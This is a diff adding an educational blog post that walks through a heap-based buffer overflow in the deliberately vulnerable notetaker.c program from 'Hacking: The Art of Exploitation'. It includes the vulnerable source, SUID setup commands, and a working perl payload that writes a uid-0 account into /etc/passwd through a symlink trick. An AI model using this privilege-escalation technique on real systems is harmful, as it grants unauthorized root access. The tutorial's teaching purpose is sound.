@@ -1,0 +1,164 @@
+<!DOCTYPE html><html lang="en" data-astro-cid-bvzihdzo> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><meta name="generator" content="Astro v4.15.4"><!-- Canonical URL --><link rel="canonical" href="https://danielorihuela.github.io/blog/heap-based-buffer-overflows/"><!-- Primary Meta Tags --><title>Heap-based buffer overflows</title><meta name="title" content="Heap-based buffer overflows"><meta name="description" content="todo"><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://danielorihuela.github.io/blog/heap-based-buffer-overflows/"><meta property="og:title" content="Heap-based buffer overflows"><meta property="og:description" content="todo"><meta property="og:image" content="https://danielorihuela.github.io/blog-placeholder-1.jpg"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://danielorihuela.github.io/blog/heap-based-buffer-overflows/"><meta property="twitter:title" content="Heap-based buffer overflows"><meta property="twitter:description" content="todo"><meta property="twitter:image" content="https://danielorihuela.github.io/blog-placeholder-1.jpg"><link rel="stylesheet" href="/_astro/_slug_.D-Spfgqn.css">
+<style>code[class*=language-],pre[class*=language-]{color:#f5f5f5;text-shadow:0 0 2px #100c0f,0 0 5px rgba(220,7,142,.2),0 0 10px rgba(255,255,255,.2);background:none;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none}pre[class*=language-]{padding:1em;overflow:auto}:not(pre)>code[class*=language-],pre[class*=language-]{background:#34294f}:not(pre)>code[class*=language-]{padding:.1em;border-radius:.3em;white-space:normal}.token.block-comment,.token.cdata,.token.comment,.token.doctype,.token.prolog{color:#969896}.token.punctuation{color:#ccc}.token.selector{color:#72f1b8;text-shadow:0 0 2px #100c0f,0 0 10px rgba(37,124,85,.4588235294),0 0 35px rgba(33,39,36,.4588235294)}.token.function-name{color:#6196cc}.token.constant,.token.symbol{color:#f92aad;text-shadow:0 0 2px #100c0f,0 0 5px rgba(220,7,142,.2),0 0 10px rgba(255,255,255,.2)}.token.attr-value,.token.char,.token.regex,.token.variable{color:#f87c32}.token.entity,.token.operator,.token.url{color:#67cdcc}.token.bold,.token.important{font-weight:700}.token.italic{font-style:italic}.token.entity{cursor:help}.token.inserted{color:green}.token.string{color:#90ee90}.token.class-name,.token.deleted,.token.directive.keyword+.token.string,.token.hexcode,.token.namespace,.token.tag,.token.unit{color:#fff;text-shadow:0 0 1px #ff4d4d,0 0 2px #ff4d4d,0 0 4px #ff4d4d,0 0 10px #ff4d4d,0 0 20px #ff4d4d}.token.macro{color:#fff;text-shadow:0 0 1px #f8d132,0 0 2px #f8d132,0 0 4px #f8d132,0 0 10px #f8d132,0 0 20px #f8d132}.token.attr-name,.token.boolean,.token.function,.token.selector .token.id{color:#fff;text-shadow:0 0 1px #00f2ff,0 0 2px #00f2ff,0 0 4px #00f2ff,0 0 10px #00f2ff,0 0 20px #00f2ff}.token.atrule,.token.builtin,.token.important,.token.keyword,.token.selector .token.class,.token.token.directive-hash{color:#fff;text-shadow:0 0 1px #bd32f8,0 0 2px #bd32f8,0 0 4px #bd32f8,0 0 10px #bd32f8,0 0 20px #bd32f8}main[data-astro-cid-bvzihdzo]{width:100%;background-color:#222}.hero-image[data-astro-cid-bvzihdzo]{width:40ch;max-width:100%;margin:auto}.hero-image[data-astro-cid-bvzihdzo] img[data-astro-cid-bvzihdzo]{display:block;margin:0 auto;border-radius:12px;box-shadow:var(--box-shadow)}.prose[data-astro-cid-bvzihdzo]{width:80ch;max-width:100%;margin:auto;color:#d3d3d3}.title[data-astro-cid-bvzihdzo]{margin-bottom:1rem;padding:1rem 0;text-align:center;line-height:1}.title[data-astro-cid-bvzihdzo] h1[data-astro-cid-bvzihdzo]{margin:0 0 .5rem}.date[data-astro-cid-bvzihdzo]{margin-bottom:.5rem;color:#fff}.last-updated-on[data-astro-cid-bvzihdzo]{font-style:italic}.title-name[data-astro-cid-bvzihdzo]{font-family:Iceland;color:#fff}.prose[data-astro-cid-bvzihdzo] img{display:flex;margin:0 auto 2em}.prose[data-astro-cid-bvzihdzo] p{margin-bottom:2em}
+</style></head> <body data-astro-cid-bvzihdzo> <header data-astro-cid-3ef6ksr2> <nav data-astro-cid-3ef6ksr2> <div class="internal-links" data-astro-cid-3ef6ksr2> <a href="/" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Home </a>  <a href="/about" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> About </a>  <a href="/blog" class="active" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Blog </a>  <a href="/open-source" data-astro-cid-3ef6ksr2 data-astro-cid-eimmu3lg> Open Source </a>  </div> </nav> </header>  <main data-astro-cid-bvzihdzo> <article data-astro-cid-bvzihdzo> <div class="hero-image" data-astro-cid-bvzihdzo> <img src="/_astro/heap-overflow.CvuaMumU_Z1zcJ8h.webp" alt="" data-astro-cid-bvzihdzo width="1024" height="1024" loading="lazy" decoding="async"> </div> <div class="prose" data-astro-cid-bvzihdzo> <div class="title" data-astro-cid-bvzihdzo> <div class="date" data-astro-cid-bvzihdzo> <time datetime="2023-11-19T00:00:00.000Z"> Nov 19, 2023 </time>  </div> <h1 class="title-name" data-astro-cid-bvzihdzo>Heap-based buffer overflows</h1> <hr data-astro-cid-bvzihdzo> </div>  <ul>
+<li><a href="#introduction">Introduction</a></li>
+<li><a href="#stack-vs-heap-based-buffer-overflows">Stack vs Heap-based buffer
+overflows?</a></li>
+<li><a href="#system-information">System information</a></li>
+<li><a href="#exercise">Exercise</a></li>
+<li><a href="#bonus-points">Bonus points</a></li>
+<li><a href="#conclusion">Conclusion</a></li>
+</ul>
+<h1 id="introduction">Introduction</h1>
+<p>In a previous post, I explained what a <a href="https://danielorihuela.github.io/posts/stack-based-buffer-overflows/">stack-based buffer
+overflow</a>
+is and how it works. Today, we are going to see the heap-based variant.</p>
+<h1 id="stack-vs-heap-based-buffer-overflows">Stack vs Heap-based buffer overflows?</h1>
+<p>The difference between those two types is the region of memory where the
+exploited variables reside. That’s easy to see in the C language. All
+variables are stored in the stack unless we use functions to allocate
+memory in the heap.</p>
+<pre class="language-c" data-language="c"><code is:raw="" class="language-c"><span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Variables stored in the stack</span></span>
+<span class="token keyword">int</span> auth_flag <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token keyword">char</span> password_buffer<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">Variables stored in the heap</span></span>
+buffer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">ec_malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<h1 id="system-information">System information</h1>
+<p>Before starting, let me mention some information about my system. Take
+them into account if you try to replicate the results. They may vary
+from machine to machine.</p>
+<ul>
+<li>Linux 5.15.0-86-generic x86_64</li>
+<li>Intel(R) Core(TM) i7-10510U CPU</li>
+<li>Little Endian</li>
+<li>48 bits address size</li>
+</ul>
+<h1 id="exercise">Exercise</h1>
+<p>We are going to exploit the <code>notetaker.c</code> program from <strong>Hacking: The
+Art of Exploitation, 2nd Edition</strong>. You can get the source code at
+<a href="https://github.com/intere/hacking/blob/master/booksrc">https://github.com/intere/hacking/blob/master/booksrc</a>. The program
+creates notes in <code>/var/notes</code>. Creating and modifying files in the root
+path requires root permissions. Hence, the executable of this program
+must be owned by the root and have the SUID activated. That way, we can
+execute it with normal users as if they were root.</p>
+<pre class="language-c" data-language="c"><code is:raw="" class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;string.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;fcntl.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&#x3C;sys/stat.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"hacking.h"</span></span>
+
+<span class="token keyword">void</span> <span class="token function">usage</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>prog_name<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>filename<span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Usage: %s &#x3C;data to add to %s>\n"</span><span class="token punctuation">,</span> prog_name<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">void</span> <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment">// A function for fatal errors</span>
+<span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">ec_malloc</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// An error-checked malloc() wrapper</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">int</span> userid<span class="token punctuation">,</span> fd<span class="token punctuation">;</span> <span class="token comment">// File descriptor</span>
+  <span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">,</span> <span class="token operator">*</span>datafile<span class="token punctuation">;</span>
+
+  buffer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">ec_malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  datafile <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">ec_malloc</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">strcpy</span><span class="token punctuation">(</span>datafile<span class="token punctuation">,</span> <span class="token string">"/var/notes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&#x3C;</span> <span class="token number">2</span><span class="token punctuation">)</span>                 <span class="token comment">// If there aren't command-line arguments,</span>
+    <span class="token function">usage</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> datafile<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// display usage message and exit.</span>
+
+  <span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Copy into buffer.</span>
+
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[DEBUG] buffer @ %p: \'%s\'\n"</span><span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[DEBUG] datafile @ %p: \'%s\'\n"</span><span class="token punctuation">,</span> datafile<span class="token punctuation">,</span> datafile<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token comment">// Opening the file</span>
+  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>datafile<span class="token punctuation">,</span> O_WRONLY <span class="token operator">|</span> O_CREAT <span class="token operator">|</span> O_APPEND<span class="token punctuation">,</span> S_IRUSR <span class="token operator">|</span> S_IWUSR<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
+    <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"in main() while opening file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[DEBUG] file descriptor is %d\n"</span><span class="token punctuation">,</span> fd<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  userid <span class="token operator">=</span> <span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Get the real user ID.</span>
+
+  <span class="token comment">// Writing data</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&#x26;</span>userid<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">// Write user ID before note data.</span>
+    <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"in main() while writing userid to file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                          <span class="token comment">// Terminate line.</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buffer<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">// Write note.</span>
+    <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"in main() while writing buffer to file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token string">"\n"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Terminate line.</span>
+  <span class="token comment">// Closing file</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
+    <span class="token function">fatal</span><span class="token punctuation">(</span><span class="token string">"in main() while closing file"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Note has been saved.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">free</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">free</span><span class="token punctuation">(</span>datafile<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>The error is copying the data from <code>argv[1]</code> to the buffer without
+checking the length. We can overflow the <code>buffer</code> variable if we pass a
+long enough argument to the executable and overwrite the <code>datafile</code>
+data.</p>
+<pre class="language-c" data-language="c"><code is:raw="" class="language-c">buffer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">ec_malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+datafile <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">ec_malloc</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">strcpy</span><span class="token punctuation">(</span>datafile<span class="token punctuation">,</span> <span class="token string">"/var/notes"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&#x3C;</span> <span class="token number">2</span><span class="token punctuation">)</span>                 <span class="token comment">// If there aren't command-line arguments,</span>
+  <span class="token function">usage</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> datafile<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// display usage message and exit.</span>
+
+<span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Copy into buffer.</span>
+</code></pre>
+<p>Let’s compile the program and give it the proper permissions.</p>
+<pre class="language-bash" data-language="bash"><code is:raw="" class="language-bash">gcc notetaker.c <span class="token parameter variable">-o</span> notetaker <span class="token parameter variable">-g</span>
+<span class="token function">sudo</span> <span class="token function">chown</span> root:root notetaker
+<span class="token function">sudo</span> <span class="token function">chmod</span> u+s notetaker
+</code></pre>
+<p>We can write to whatever file we want, <code>testfile</code> for example.</p>
+<p><img  src="/_astro/create-testfile.Bvg7LFjj_1v0s09.webp" alt="" width="1033" height="229" loading="lazy" decoding="async"></p>
+<p>We exploited it!</p>
+<h1 id="bonus-points">Bonus points</h1>
+<p>The exercise is helpful but dull. We can do something more interesting
+when exploiting that program. We can create a new root user with any
+password that we want. Let me show you.</p>
+<p>In Linux, there’s the /etc/passwd file where the basic information
+related to users is stored. Each entry includes the login name, hashed
+password, user id, group id, username, home directory and login shell of
+a user, separated by colons (e.g. <code>root:x:0:0:root:/root:/bin/bash</code>). We
+can add a manually prepared entry to <code>/etc/passwd</code>, but how do we create
+the hashed password?</p>
+<p>There are plenty of hashing functions. There’s no constraint in linux,
+so we can use whichever one we want. I decided to use <code>crypt</code> from perl
+with a simple password (1234) and salt (AA).</p>
+<pre class="language-bash" data-language="bash"><code is:raw="" class="language-bash">perl <span class="token parameter variable">-e</span> <span class="token string">'print crypt("1234", "AA"), "\n"'</span>
+</code></pre>
+<p>The result is <code>AA3BKXQMdIWHE</code>. The entry would then look like
+<code>newrootuser:AA3BKXQMdIWHE:0:0:root:/root:/bin/bash</code>. There’s still
+another problem to solve. Remember that for the exploit to work, the
+final part of the argument must be the file where we want to write the
+data. It should be something similar to
+<code>newrootuser:AA3BKXQMdIWHE:0:0:root:/root:/etc/passwd</code>. However, this is
+not a valid entry. The last part is no longer a shell, but a file. We
+can sidestep this problem with a symbolic link. That’s the cool part,
+pay attention.</p>
+<pre class="language-bash" data-language="bash"><code is:raw="" class="language-bash"><span class="token function">mkdir</span> /tmp/etc
+<span class="token function">ln</span> <span class="token parameter variable">-s</span> /bin/bash /tmp/etc/passwd
+</code></pre>
+<p>We just created a symbolic link in <code>/tmp/etc/passwd</code> to a shell. That
+way, we can create a payload that ends with a login shell and the
+filename we want to overwrite. Pretty slick, right? We can then rewrite
+the entry as <code>newrootuser:AA3BKXQMdIWHE:0:0:root:/root:/tmp/etc/passwd</code>.
+The last step is to make it longer to overflow the buffer.</p>
+<pre class="language-bash" data-language="bash"><code is:raw="" class="language-bash">./notetaker <span class="token variable"><span class="token variable">$(</span>perl <span class="token parameter variable">-e</span> <span class="token string">'print "newrootuser:AA3BKXQMdIWHE:0:0:", "A" x 71, ":/root:/tmp/etc/passwd"'</span><span class="token variable">)</span></span>
+</code></pre>
+<p><img  src="/_astro/root-access.BcHLyohL_Z2w1HD0.webp" alt="" width="1249" height="289" loading="lazy" decoding="async"></p>
+<h1 id="conclusion">Conclusion</h1>
+<p>Exploiting heap and stack buffer overflows has the same difficulty.
+Everything we know about one variant can be applied to the other (as far
+as I know). They are easy to exploit and protect. However, software
+engineers should be aware of their existence and how to avoid them.
+There is no excuse for avoiding them in your programs!</p>  </div> </article> </main> <footer></footer> </body></html>
